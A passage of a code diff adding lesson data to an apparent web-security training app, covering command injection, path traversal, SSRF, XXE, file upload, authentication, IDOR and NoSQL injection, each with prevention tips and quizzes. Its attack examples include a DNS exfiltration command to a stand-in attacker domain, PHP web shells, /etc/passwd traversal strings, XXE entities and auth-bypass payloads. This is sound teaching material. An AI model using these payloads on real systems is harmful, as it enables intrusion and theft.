+    {name:"In-band",desc:"Command output appears in the HTTP response.",c:'#ff4d4d'},
+    {name:"Blind: time delay",desc:"Inject ping -c 10 127.0.0.1 and measure response time.",c:'#ff9500'},
+    {name:"Blind: output redirection",desc:"Write output to a file in the web root, then fetch it.",c:'#ffd60a'},
+    {name:"Blind: out-of-band (OAST)",desc:"Trigger a DNS or HTTP interaction with a server you control, optionally carrying the command output.",c:'#3b9eff'}
+  ],
+  examples:[
+    {title:"Basic injection",kind:"atk",lang:"Shell",code:`# App runs:   stockreport.pl 381 29
+# productID = & echo aiwefwlguh &
+stockreport.pl & echo aiwefwlguh & 29
+
+# Output:
+# Error - productID was not provided
+# aiwefwlguh            <- injected command ran
+# 29: command not found`},
+    {title:"Separators and substitution",kind:"atk",lang:"Shell",code:`# Both Windows and Unix:   &   &&   |   ||
+# Unix only:               ;   newline (0x0a)
+# Inline execution (Unix): \`injected\`   or   $(injected)
+
+# Quoted context: close the quote first
+input = foo"; whoami; echo "`},
+    {title:"Blind detection and exfiltration",kind:"atk",lang:"Shell",code:`# Time delay (response ~10s slower => vulnerable)
+& ping -c 10 127.0.0.1 &
+
+# Redirect output to a retrievable file
+& whoami > /var/www/static/whoami.txt &
+
+# Out-of-band DNS exfiltration
+& nslookup \`whoami\`.kgji2ohoyw.web-attacker.com &`},
+    {title:"Safe alternative",kind:"good",lang:"Python",code:`import subprocess
+
+# VULNERABLE: shell interprets the string
+subprocess.run(f"ping -c 1 {user_ip}", shell=True)
+
+# SAFER: argument list, no shell, plus strict validation
+import ipaddress
+ip = str(ipaddress.ip_address(user_ip))   # raises on junk
+subprocess.run(["ping", "-c", "1", ip])`}
+  ],
+  prevention:["Don't call OS commands from application code; use platform APIs instead","If unavoidable, validate against a whitelist, or allow only numbers / alphanumerics","Pass arguments as a list without invoking a shell","Never rely on escaping shell metacharacters; it is too error-prone","Run the application with least privilege"],
+  quiz:[
+    {q:"Which separator works on both Windows and Unix?",opts:[";","newline","&","backtick"],ans:2,exp:"&, &&, | and || work on both. ; and newline are Unix-only; backticks and $() are Unix inline execution."},
+    {q:"How do you confirm blind command injection with no visible output?",opts:["Check status codes","Inject a time delay such as ping -c 10","Read /etc/passwd","Inspect cookies"],ans:1,exp:"A measurable delay proves the command ran. OAST (DNS lookups) is another reliable technique."},
+    {q:"Best defense against command injection?",opts:["Escape metacharacters","Use a WAF","Avoid shell commands and use safer APIs","URL-encode input"],ans:2,exp:"Avoiding the shell eliminates the class. Where unavoidable, strict whitelist validation is the fallback; escaping is discouraged."},
+    {q:"What does nslookup `whoami`.attacker.com do?",opts:["Runs SQL","Sends the current username in a DNS query to the attacker","Reads a file","Reboots the host"],ans:1,exp:"The backticks run whoami and its output becomes a subdomain in the lookup, exfiltrating data out-of-band."}
+  ],
+  refs:[
+    {src:"OWASP",name:"Command Injection",url:"https://owasp.org/www-community/attacks/Command_Injection"},
+    {src:"MITRE",name:"CWE-78: OS Command Injection",url:"https://cwe.mitre.org/data/definitions/78.html"}
+  ]
+},
+{
+  id:'path', icon:'📁', name:'Path Traversal', group:'server',
+  short:'Read arbitrary server files by escaping the intended directory.',
+  severity:'high', sevColor:'#ff9500',
+  tags:['File read','../','Encoding bypass','Canonicalization'],
+  desc:'Path (directory) traversal lets attackers read arbitrary files such as application code, credentials and OS files, and sometimes write files, by manipulating file paths with ../ sequences.',
+  flow:[{t:"?filename=../../../etc/passwd",c:'fn-v'},{t:"→"},{t:"/var/www/images/../../../etc/passwd",c:'fn-x'},{t:"→"},{t:"Resolves to /etc/passwd",c:'fn-db'},{t:"→"},{t:"File contents returned",c:'fn-i'}],
+  howItWorks:"If an app appends user input to a base directory and reads the result, ../ moves up one level each time. Three of them from /var/www/images/ reach the filesystem root, so any readable file is reachable.",
+  types:[
+    {name:"Simple traversal",desc:"Unfiltered ../ sequences in a filename parameter.",c:'#ff4d4d'},
+    {name:"Absolute path bypass",desc:"filename=/etc/passwd when traversal sequences are blocked.",c:'#ff9500'},
+    {name:"Nested sequences",desc:"....// survives non-recursive stripping and becomes ../",c:'#ffd60a'},
+    {name:"Encoding bypass",desc:"%2e%2e%2f, double-encoded %252e%252e%252f, or ..%c0%af",c:'#a855f7'},
+    {name:"Start-of-path / extension checks",desc:"/var/www/images/../../../etc/passwd or ../../../etc/passwd%00.png",c:'#3b9eff'}
+  ],
+  examples:[
+    {title:"Basic traversal",kind:"atk",lang:"HTTP",code:`# Normal request
+GET /loadImage?filename=218.png        -> /var/www/images/218.png
+
+# Attack
+GET /loadImage?filename=../../../etc/passwd
+# Server reads /var/www/images/../../../etc/passwd == /etc/passwd
+
+# Windows accepts both separators
+GET /loadImage?filename=..\\..\\..\\windows\\win.ini`},
+    {title:"Bypass techniques",kind:"atk",lang:"Text",code:`# Absolute path (traversal blocked)
+filename=/etc/passwd
+
+# Non-recursive stripping
+filename=....//....//....//etc/passwd
+
+# URL / double-URL encoding
+filename=..%2f..%2f..%2fetc/passwd
+filename=%252e%252e%252f%252e%252e%252fetc/passwd
+
+# Required base folder
+filename=/var/www/images/../../../etc/passwd
+
+# Required extension (null byte)
+filename=../../../etc/passwd%00.png`},
+    {title:"Safe implementation",kind:"good",lang:"Java",code:`File file = new File(BASE_DIRECTORY, userInput);
+if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
+    // safe to process: the resolved path is still inside the base dir
+} else {
+    throw new SecurityException("Path traversal attempt");
+}`}
+  ],
+  prevention:["Avoid passing user input to filesystem APIs; map IDs to files instead","Validate against a whitelist or alphanumeric-only rule","Canonicalize the final path and verify it starts with the expected base directory","Run the app with minimal filesystem permissions"],
+  quiz:[
+    {q:"How many ../ reach the root from /var/www/images/?",opts:["1","2","3","4"],ans:2,exp:"images -> www -> var -> /, so three."},
+    {q:"What does canonicalization achieve?",opts:["Encrypts the path","Resolves ../, symlinks and encodings into one absolute path to check","Checks permissions","Strips extensions"],ans:1,exp:"Checking the resolved path against the base directory defeats most encoding and nesting tricks."},
+    {q:"Why does %00 help bypass an extension check?",opts:["It encodes a space","It terminates the string in lower-level code, so the .png suffix is ignored","It is a wildcard","It bypasses TLS"],ans:1,exp:"Validation sees ...passwd%00.png but C-style file APIs stop at the null byte."}
+  ],
+  refs:[
+    {src:"OWASP",name:"Path Traversal",url:"https://owasp.org/www-community/attacks/Path_Traversal"},
+    {src:"MITRE",name:"CWE-22: Path Traversal",url:"https://cwe.mitre.org/data/definitions/22.html"}
+  ]
+},
+{
+  id:'ssrf', icon:'🔄', name:'Server-Side Request Forgery', group:'server',
+  short:'Make the server send requests to internal or cloud resources for you.',
+  severity:'critical', sevColor:'#ff4d4d',
+  tags:['Internal access','Cloud metadata','Blind','Filter bypass'],
+  desc:"SSRF makes the server-side application issue requests to an unintended location: its own loopback interface, internal back-end systems, or arbitrary external hosts. Trust relationships make this critical.",
+  flow:[{t:"Attacker",c:'fn-a'},{t:"→"},{t:"stockApi=http://localhost/admin",c:'fn-v'},{t:"→"},{t:"Server requests itself",c:'fn-s'},{t:"→"},{t:"Access control bypassed",c:'fn-x'},{t:"→"},{t:"Admin content returned",c:'fn-i'}],
+  howItWorks:"When an app fetches a URL taken from user input, the request originates from the server's network position. Requests from 127.0.0.1 or the internal network are often trusted, so internal admin panels and metadata services become reachable.",
+  types:[
+    {name:"Against the server itself",desc:"http://localhost/admin or 127.0.0.1 bypasses front-end access controls.",c:'#ff4d4d'},
+    {name:"Against back-end systems",desc:"Non-routable addresses such as 192.168.0.68 with weak internal security.",c:'#ff6b6b'},
+    {name:"Blind SSRF",desc:"The response isn't returned; detect via out-of-band interaction.",c:'#3b9eff'},
+    {name:"Filter bypasses",desc:"Alternative IP forms, DNS tricks, URL parsing quirks, open redirects.",c:'#ffd60a'},
+    {name:"Hidden surface",desc:"Partial URLs, XML (XXE), and the Referer header processed by analytics software.",c:'#a855f7'}
+  ],
+  examples:[
+    {title:"SSRF against the local server",kind:"atk",lang:"HTTP",code:`POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+
+stockApi=http://localhost/admin
+
+# The request now comes from the local machine, so the admin
+# interface may treat it as trusted.`},
+    {title:"SSRF against another back-end system",kind:"atk",lang:"HTTP",code:`stockApi=http://192.168.0.68/admin
+
+# Scan the internal range by iterating the last octet (Burp Intruder)`},
+    {title:"Blacklist and whitelist bypass ideas",kind:"atk",lang:"Text",code:`# Alternative representations of 127.0.0.1
+2130706433
+017700000001
+127.1
+
+# Case variation / URL encoding of blocked strings
+http://127.0.0.1/%61dmin
+
+# Whitelist parser confusion
+https://expected-host:fakepassword@evil-host
+https://evil-host#expected-host
+https://expected-host.evil-host
+
+# Redirect-based: whitelisted open redirect pointing inward
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin`},
+    {title:"Defensive pattern",kind:"good",lang:"Python",code:`import ipaddress, socket
+from urllib.parse import urlparse
+
+ALLOWED_HOSTS = {"stock.example.com"}
+
+def safe_fetch_target(url):
+    u = urlparse(url)
+    if u.scheme != "https" or u.hostname not in ALLOWED_HOSTS:
+        raise ValueError("host not allowed")
+    ip = ipaddress.ip_address(socket.gethostbyname(u.hostname))
+    if ip.is_private or ip.is_loopback or ip.is_link_local:
+        raise ValueError("internal address")
+    return url   # also: disable redirects in the HTTP client`}
+  ],
+  prevention:["Whitelist allowed hosts; prefer fixed endpoints selected by ID instead of user-supplied URLs","Resolve and block loopback, private and link-local ranges after DNS resolution","Disable or re-validate redirects in server-side HTTP clients","Don't return raw upstream responses to users","Require authentication on internal services; don't trust the network position alone"],
+  quiz:[
+    {q:"Why does a request to localhost often bypass access control?",opts:["It is faster","Components trust requests from the local machine","It skips TLS","It uses a special protocol"],ans:1,exp:"Checks may live in a front-end component, allow recovery access from the host itself, or listen on a port not exposed to users."},
+    {q:"Which is an alternative representation of 127.0.0.1 used to evade filters?",opts:["2130706433","127.0.0.256","10.0.0.1","169.254.0.1"],ans:0,exp:"The 32-bit integer form 2130706433 (also octal and short forms like 127.1) may slip past string-based blacklists."},
+    {q:"What is blind SSRF?",opts:["SSRF with no network","The back-end response isn't returned to you","SSRF only on mobile","SSRF through images"],ans:1,exp:"You can make the server send a request but can't see the response, so you confirm it with out-of-band techniques (e.g. Burp Collaborator)."},
+    {q:"How can an open redirect help SSRF?",opts:["It speeds the request","A whitelisted URL redirects the server to an internal target","It disables TLS","It encodes IPs"],ans:1,exp:"The filter sees an allowed domain, but the HTTP client follows the redirect to the attacker's chosen internal URL."}
+  ],
+  refs:[
+    {src:"OWASP",name:"SSRF Prevention Cheat Sheet",url:"https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"},
+    {src:"PortSwigger",name:"URL validation bypass cheat sheet",url:"https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet"}
+  ]
+},
+{
+  id:'xxe', icon:'📋', name:'XXE Injection', group:'server',
+  short:'Abuse XML parsers to read files or perform SSRF.',
+  severity:'high', sevColor:'#ff9500',
+  tags:['XML','File read','SSRF','Blind'],
+  desc:"XML external entity injection interferes with an application's processing of XML. It often exposes files on the server and can be escalated to SSRF or, in some cases, server compromise.",
+  flow:[{t:"Malicious DOCTYPE",c:'fn-v'},{t:"→"},{t:"Parser resolves &xxe;",c:'fn-x'},{t:"→"},{t:"Reads file:///etc/passwd",c:'fn-db'},{t:"→"},{t:"Contents in response",c:'fn-i'}],
+  howItWorks:"XML supports custom entities defined in a DTD. External entities load their value from a file path or URL. Parsers support this feature by default even when the app never uses it, so an attacker who controls XML can pull in local files or make network requests.",
+  types:[
+    {name:"File retrieval",desc:"Define an entity from file:///... and use it in a returned data value.",c:'#ff4d4d'},
+    {name:"SSRF via XXE",desc:"Entity defined from an internal URL.",c:'#ff9500'},
+    {name:"Blind XXE",desc:"Detect and exfiltrate data out-of-band, or via error messages.",c:'#3b9eff'},
+    {name:"XInclude",desc:"When you control only a data value inside a server-built XML document.",c:'#a855f7'},
+    {name:"Hidden surface",desc:"File uploads (SVG, DOCX) and requests where the content type is changed to XML.",c:'#ffd60a'}
+  ],
+  examples:[
+    {title:"Retrieve a file",kind:"atk",lang:"XML",code:`<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+
+<\!-- Response: Invalid product ID: root:x:0:0:root:/root:/bin/bash ... -->`},
+    {title:"SSRF via XXE",kind:"atk",lang:"XML",code:`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`},
+    {title:"XInclude (no DOCTYPE control)",kind:"atk",lang:"XML",code:`<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>`},
+    {title:"Hardening a parser",kind:"good",lang:"Java",code:`DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);`}
+  ],
+  prevention:["Disable DOCTYPE processing or at least external entity resolution","Disable XInclude support","Check your library's documentation for the exact configuration flags","Prefer simpler formats such as JSON where XML isn't required"],
+  quiz:[
+    {q:"What feature enables XXE?",opts:["XPath","External entities in a DTD","XSLT","Schema validation"],ans:1,exp:"External entities load values from files or URLs, and parsers resolve them by default."},
+    {q:"Which URI scheme reads local files in a classic XXE?",opts:["http://","file://","ftp://","ssh://"],ans:1,exp:"file:///etc/passwd defines an entity whose value is the file's contents."},
+    {q:"When is XInclude useful?",opts:["When you control the whole document","When you control only one value placed into a server-side XML document","When the app uses JSON only","When TLS is off"],ans:1,exp:"You can't add a DOCTYPE, but XInclude can be placed inside any data value."},
+    {q:"What is blind XXE?",opts:["XXE in images only","The entity value isn't returned in responses","XXE without a DOCTYPE","XXE on mobile"],ans:1,exp:"You rely on out-of-band interactions or error messages to detect and extract data."}
+  ],
+  refs:[
+    {src:"OWASP",name:"XXE Prevention Cheat Sheet",url:"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"},
+    {src:"MITRE",name:"CWE-611: XXE",url:"https://cwe.mitre.org/data/definitions/611.html"}
+  ]
+},
+{
+  id:'fileupload', icon:'📤', name:'File Upload Vulnerabilities', group:'server',
+  short:'Upload malicious files to reach remote code execution.',
+  severity:'critical', sevColor:'#ff4d4d',
+  tags:['RCE','Web shell','MIME bypass','Polyglot'],
+  desc:"When servers don't sufficiently validate an uploaded file's name, type, content or size, even an image upload can be used to plant server-side scripts (web shells), overwrite files, or deliver client-side payloads.",
+  flow:[{t:"Upload shell.php",c:'fn-a'},{t:"→"},{t:"Bypass type check",c:'fn-v'},{t:"→"},{t:"File stored in web dir",c:'fn-s'},{t:"→"},{t:"Request the file",c:'fn-x'},{t:"→"},{t:"Code executes",c:'fn-i'}],
+  howItWorks:"If the type isn't validated properly and the server is configured to execute that type, an uploaded script runs as code. Validation is commonly flawed: trusting the Content-Type header, blacklisting extensions, or checking only magic bytes.",
+  types:[
+    {name:"Unrestricted upload",desc:"No validation, executable file accepted and run.",c:'#ff4d4d'},
+    {name:"Content-Type trust",desc:"The part's Content-Type header is client-controlled.",c:'#ff9500'},
+    {name:"Extension blacklist bypass",desc:".php5, .phtml, .shtml, case changes, double extensions, trailing dots, null bytes, .htaccess/web.config overrides.",c:'#ffd60a'},
+    {name:"Content validation bypass",desc:"Polyglot files, e.g. PHP inside JPEG metadata.",c:'#a855f7'},
+    {name:"Race conditions",desc:"File exists briefly before validation removes it.",c:'#3b9eff'},
+    {name:"Non-RCE impact",desc:"Stored XSS via SVG/HTML, XXE via XML formats, PUT uploads.",c:'#6b7280'}
+  ],
+  examples:[
+    {title:"Simple web shells",kind:"atk",lang:"PHP",code:`<?php echo file_get_contents('/path/to/target/file'); ?>
+
+<?php echo system($_GET['command']); ?>
+
+# After upload:
+GET /uploads/exploit.php?command=id HTTP/1.1`},
+    {title:"Content-Type restriction bypass",kind:"atk",lang:"HTTP",code:`POST /images HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------------0123
+
+-----------------------------0123
+Content-Disposition: form-data; name="image"; filename="exploit.php"
+Content-Type: image/jpeg        <-- attacker-controlled
+
+<?php echo system($_GET['command']); ?>
+-----------------------------0123--`},
+    {title:"Extension obfuscation",kind:"atk",lang:"Text",code:`exploit.pHp            # case differences
+exploit.php.jpg        # multiple extensions
+exploit.php.           # trailing characters
+exploit%2Ephp          # URL-encoded dot
+exploit.asp;.jpg       # semicolon
+exploit.asp%00.jpg     # null byte
+exploit.p.phphp        # non-recursive stripping of ".php"`},
+    {title:"Secure handling",kind:"good",lang:"Text",code:`- Whitelist extensions (not a blacklist)
+- Reject names containing traversal sequences
+- Rename uploads to random names
+- Store outside the web root / in object storage; serve via app code
+- Don't write to permanent storage until fully validated
+- Disable script execution in upload directories
+- Use an established framework for upload handling`}
+  ],
+  prevention:["Whitelist permitted extensions rather than blacklisting dangerous ones","Validate content as well as name, and don't trust Content-Type","Rename files and strip path components from filenames","Keep uploads out of executable locations and validate before moving to final storage","Use established frameworks instead of custom upload logic"],
+  quiz:[
+    {q:"Why is a whitelist better than a blacklist for extensions?",opts:["It's faster","Blacklists miss obscure executable extensions","Whitelists allow more files","No difference"],ans:1,exp:"It is much easier to list what you expect than every extension an attacker might try."},
+    {q:"What is a polyglot file?",opts:["A multilingual document","A file valid as two formats, e.g. JPEG carrying PHP in metadata","A file with a long name","An encrypted file"],ans:1,exp:"It passes content checks as an image yet can contain executable code."},
+    {q:"Why is the multipart Content-Type header unreliable?",opts:["It's encrypted","The client sets it and can lie","It's too long","Servers ignore it"],ans:1,exp:"It's attacker-controlled; servers must verify the actual content."},
+    {q:"What does exploit.p.phphp demonstrate?",opts:["Case bypass","Non-recursive stripping leaving .php behind","Null byte","Double URL encoding"],ans:1,exp:"Removing '.php' once from exploit.p.phphp leaves exploit.php."}
+  ],
+  refs:[
+    {src:"OWASP",name:"File Upload Cheat Sheet",url:"https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"},
+    {src:"MITRE",name:"CWE-434: Unrestricted Upload",url:"https://cwe.mitre.org/data/definitions/434.html"}
+  ]
+},
+{
+  id:'auth', icon:'🔑', name:'Authentication Vulnerabilities', group:'auth',
+  short:'Bypass login mechanisms or take over accounts.',
+  severity:'critical', sevColor:'#ff4d4d',
+  tags:['Brute-force','MFA bypass','Password reset','Enumeration'],
+  desc:"Authentication verifies who a user is. Flaws arise from weak brute-force protection or logic errors that allow bypass entirely, and the impact is access to everything the compromised account can reach.",
+  flow:[{t:"Attacker",c:'fn-a'},{t:"→"},{t:"Brute-force or logic flaw",c:'fn-v'},{t:"→"},{t:"Mechanism bypassed",c:'fn-x'},{t:"→"},{t:"Account access",c:'fn-i'}],
+  howItWorks:"Three factor types exist: something you know, have, or are. Weaknesses include guessable credentials without rate limiting, response differences that reveal valid usernames, flawed MFA flows, predictable reset tokens and insecure 'remember me' cookies.",
+  types:[
+    {name:"Username enumeration",desc:"Different status codes, messages or response times for valid vs invalid usernames.",c:'#ffd60a'},
+    {name:"Brute-force and credential stuffing",desc:"Bypass protection via IP rotation, per-request lockout reset, multiple guesses per request.",c:'#ff4d4d'},
+    {name:"MFA flaws",desc:"Skipping the second step, flawed verification logic, brute-forcing codes.",c:'#a855f7'},
+    {name:"Password reset flaws",desc:"Predictable tokens, token not validated, host-header poisoning.",c:'#3b9eff'},
+    {name:"Stay-logged-in cookies",desc:"Predictable or offline-crackable cookies.",c:'#ff9500'}
+  ],
+  examples:[
+    {title:"Username enumeration by timing",kind:"atk",lang:"HTTP",code:`# Invalid user -> rejected immediately
+POST /login  username=notreal&password=x    ~200ms
+# Valid user -> password is hashed first
+POST /login  username=admin&password=<long string>   ~320ms+
+
+# Use a very long password to amplify the difference`},
+    {title:"2FA simple bypass",kind:"atk",lang:"HTTP",code:`# 1. Log in with valid credentials
+POST /login  -> 302 /login2   (session cookie already issued)
+
+# 2. Skip the code page and browse straight in
+GET /my-account
+Cookie: session=<value from step 1>
+# 200 OK: the second factor was never enforced`},
+    {title:"Reset token weaknesses",kind:"atk",lang:"Text",code:`# Predictable: token derived from time / username / sequence
+/reset?token=1735689600
+
+# Not validated: change the username in the final reset request
+POST /reset  token=<your token>&username=victim&new-password=...`},
+    {title:"Secure design checklist",kind:"good",lang:"Text",code:`- Don't treat the user as logged in until ALL factors are verified
+- Rate-limit per account and per client, with increasing delays
+- Same generic message and timing for every failed login
+- Reset tokens: high-entropy, single-use, short expiry, bound to the user
+- Hash passwords with bcrypt / scrypt / Argon2`}
+  ],
+  prevention:["Use generic error messages and consistent timing for failed logins","Implement robust brute-force protection (rate limiting, lockout, CAPTCHA)","Verify MFA before establishing an authenticated session","Generate unpredictable, expiring, single-use reset tokens","Enforce a sensible password policy and store hashes with a slow KDF"],
+  quiz:[
+    {q:"What is credential stuffing?",opts:["Brute-forcing every password","Trying username/password pairs leaked from other breaches","SQLi on login","Reflected XSS"],ans:1,exp:"Password reuse makes leaked credentials work on other sites."},
+    {q:"What makes a reset token secure?",opts:["Long validity","Random, single-use, short-lived and tied to the user","Derived from the username","Included in the page source"],ans:1,exp:"Predictable or reusable tokens allow account takeover."},
+    {q:"How can timing reveal valid usernames?",opts:["Different cookies","Valid users trigger extra work such as password hashing","Different HTTP versions","Different TLS ciphers"],ans:1,exp:"A measurable difference between valid and invalid usernames leaks existence."},
+    {q:"What is the flaw in the '2FA simple bypass'?",opts:["Weak code","The session was usable before the second step was completed","SQL injection","Open redirect"],ans:1,exp:"The app doesn't verify that step two was completed before granting access to protected pages."}
+  ],
+  refs:[
+    {src:"OWASP",name:"Authentication Cheat Sheet",url:"https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"},
+    {src:"NIST",name:"SP 800-63B Digital Identity Guidelines",url:"https://pages.nist.gov/800-63-3/sp800-63b.html"}
+  ]
+},
+{
+  id:'access', icon:'🚪', name:'Access Control & IDOR', group:'auth',
+  short:"Escalate privileges or reach other users' data.",
+  severity:'high', sevColor:'#ff9500',
+  tags:['IDOR','Vertical','Horizontal','Broken access'],
+  desc:"Access control decides what an authenticated user may do. Broken controls allow vertical privilege escalation (user to admin), horizontal escalation (other users' data) and bypass of multi-step or context-dependent rules.",
+  flow:[{t:"User 123",c:'fn-s'},{t:"→"},{t:"Changes ?id=456",c:'fn-v'},{t:"→"},{t:"No ownership check",c:'fn-x'},{t:"→"},{t:"User 456's data returned",c:'fn-i'}],
+  howItWorks:"Applications must enforce on the server, for every request, who may access which function or object. Failures include unprotected admin URLs, trust in user-controllable parameters, platform-layer rules bypassed via headers or methods, and missing checks on later steps of a workflow.",
+  types:[
+    {name:"Vertical escalation",desc:"Unprotected or merely obscured admin functionality; role in a cookie or parameter.",c:'#ff4d4d'},
+    {name:"Horizontal escalation (IDOR)",desc:"User-controlled identifiers reference other users' objects. GUIDs can leak elsewhere.",c:'#ff9500'},
+    {name:"Horizontal to vertical",desc:"Take over an admin's account page or password via IDOR.",c:'#ffd60a'},
+    {name:"Platform misconfiguration",desc:"X-Original-URL header override, HTTP method switching, URL-matching discrepancies.",c:'#a855f7'},
+    {name:"Multi-step and Referer-based",desc:"Final step unprotected, or access based on a forgeable Referer header.",c:'#3b9eff'}
+  ],
+  examples:[
+    {title:"IDOR",kind:"atk",lang:"HTTP",code:`GET /myaccount?id=123   -> your own page
+GET /myaccount?id=456   -> someone else's page
+# The server never checks that id=456 belongs to the session user`},
+    {title:"Unprotected / obscured admin function",kind:"atk",lang:"HTML",code:`<script>
+  var isAdmin = false;
+  if (isAdmin) {
+    var a = document.createElement('a');
+    a.setAttribute('href', 'https://insecure-website.com/administrator-panel-yb556');
+    a.innerText = 'Admin panel';
+  }
+<\/script>
+<\!-- The unpredictable URL is visible to every user in the source,
+     and robots.txt may list it too -->`},
+    {title:"URL override via header",kind:"atk",lang:"HTTP",code:`POST / HTTP/1.1
+X-Original-URL: /admin/deleteUser
+...
+# Front-end rule denies POST /admin/deleteUser, but the framework
+# routes using the header value`},
+    {title:"Principles in practice",kind:"good",lang:"Python",code:`def get_order(request, order_id):
+    order = Order.objects.filter(id=order_id, owner=request.user).first()
+    if order is None:
+        raise Http404          # deny by default, same response either way
+    return order`}
+  ],
+  prevention:["Deny by default unless a resource is intentionally public","Enforce checks server-side on every request, including every step of a workflow","Use a single, application-wide access control mechanism","Never rely on obscurity, client-side values or Referer headers","Audit and test access controls thoroughly"],
+  quiz:[
+    {q:"What is IDOR?",opts:["Injecting code in object references","User-supplied identifiers used to reach objects without authorization checks","A DoS technique","Session fixation"],ans:1,exp:"It's a common access control flaw where changing an identifier exposes another user's data."},
+    {q:"Horizontal vs vertical escalation?",opts:["Same thing","Horizontal: same-level users' data; vertical: higher privileges","Horizontal is client-side","Vertical is only for APIs"],ans:1,exp:"Horizontal reaches peers' resources; vertical reaches functionality reserved for higher roles."},
+    {q:"Why is an unpredictable admin URL not real protection?",opts:["URLs are public by spec","It can leak via JS, robots.txt, or other pages","It breaks HTTPS","Browsers block it"],ans:1,exp:"Security by obscurity doesn't enforce authorization."},
+    {q:"What does X-Original-URL abuse exploit?",opts:["TLS","Front-end URL rules vs back-end header-based routing","Cookies","DNS"],ans:1,exp:"The front end checks the real path, but the application honours the override header."}
+  ],
+  refs:[
+    {src:"OWASP",name:"Access Control Cheat Sheet",url:"https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html"},
+    {src:"OWASP",name:"Testing for IDOR",url:"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References"}
+  ]
+},
+{
+  id:'nosql', icon:'🍃', name:'NoSQL Injection', group:'server',
+  short:'Break NoSQL query syntax or inject operators to bypass auth and extract data.',
+  severity:'high', sevColor:'#ff9500',
+  tags:['MongoDB','Operators','$where','Auth bypass'],
+  desc:"NoSQL injection interferes with queries to databases such as MongoDB. It can bypass authentication, extract or edit data, cause denial of service or even run code on the server.",
+  flow:[{t:'{"$ne":"invalid"}',c:'fn-v'},{t:"→"},{t:"Merged into the query",c:'fn-x'},{t:"→"},{t:"Matches every user",c:'fn-db'},{t:"→"},{t:"Login bypassed",c:'fn-i'}],
+  howItWorks:"Two flavours exist. Syntax injection breaks the query syntax, much like SQLi. Operator injection supplies query operators ($ne, $in, $regex, $where) as input, often by turning a string value into a nested object.",
+  types:[
+    {name:"Syntax injection",desc:"Fuzz with special characters, test boolean conditions (' && 0 && 'x vs ' && 1 && 'x), override with '||'1'=='1.",c:'#ff4d4d'},
+    {name:"Operator injection",desc:"Replace values with operator objects, e.g. username[$ne]=invalid or JSON nesting.",c:'#ff9500'},
+    {name:"JavaScript via $where",desc:"Extract data and field names character by character with boolean conditions.",c:'#a855f7'},
+    {name:"$regex extraction",desc:"password:{$regex:'^a.*'} reveals data without running JavaScript.",c:'#ffd60a'},
+    {name:"Timing-based",desc:"Conditional delays when responses show no difference.",c:'#3b9eff'}
+  ],
+  examples:[
+    {title:"Operator injection: auth bypass",kind:"atk",lang:"JSON",code:`// Normal
+{"username":"wiener","password":"peter"}
+
+// Injected
+{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
+
+// Logs in as the first matching account without knowing the password`},
+    {title:"Syntax injection",kind:"atk",lang:"HTTP",code:`# Query: this.category == 'fizzy'
+GET /product/lookup?category=fizzy'%7c%7c'1'=='1
+# Becomes: this.category == 'fizzy'||'1'=='1'   -> all products
+
+# Null byte can drop later conditions
+GET /product/lookup?category=fizzy'%00`},
+    {title:"Extract data with $where / $regex",kind:"atk",lang:"JSON",code:`{"username":"admin","password":"x","$where":"this.password[0]=='a'"}
+
+{"username":"admin","password":{"$regex":"^a.*"}}
+
+// Field names:
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"`},
+    {title:"Defensive validation",kind:"good",lang:"JavaScript",code:`const { username, password } = req.body;
+if (typeof username !== 'string' || typeof password !== 'string') {
+  return res.status(400).json({ error: 'Invalid input' });
+}
+// Allowlist keys; never pass raw request objects into queries
+const user = await User.findOne({ username });`}
+  ],
+  prevention:["Validate types and use an allowlist of accepted characters","Never place user-supplied objects directly into a query; allowlist keys","Use parameterized or ODM-level queries","Avoid $where and server-side JavaScript where possible","Read your database's security documentation"],
+  quiz:[
+    {q:"Which operator means 'not equal'?",opts:["$gt","$ne","$in","$where"],ans:1,exp:"{ '$ne': 'invalid' } matches any value other than 'invalid', i.e. almost everything."},
+    {q:"What is operator injection?",opts:["Typing SQL keywords","Supplying query operators as input to alter query logic","Overflowing buffers","Uploading scripts"],ans:1,exp:"Query operators are inserted as nested objects or bracket parameters."},
+    {q:"What can $where do?",opts:["Join collections","Evaluate a JavaScript expression","Sort results","Create indexes"],ans:1,exp:"JavaScript evaluation lets you test conditions and extract data character by character."},
+    {q:"Which defense fits best?",opts:["Block the word 'mongo'","Validate that inputs are the expected primitive types","Use longer passwords","Disable HTTPS"],ans:1,exp:"Rejecting objects where strings are expected stops operator injection."}
+  ],
+  refs:[
+    {src:"MongoDB",name:"Security Checklist",url:"https://www.mongodb.com/docs/manual/administration/security-checklist/"},
+    {src:"OWASP",name:"Testing for NoSQL Injection",url:"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"}
+  ]
+},
+{
+  id:'race', icon:'⚡', name:'Race Conditions', group:'auth',
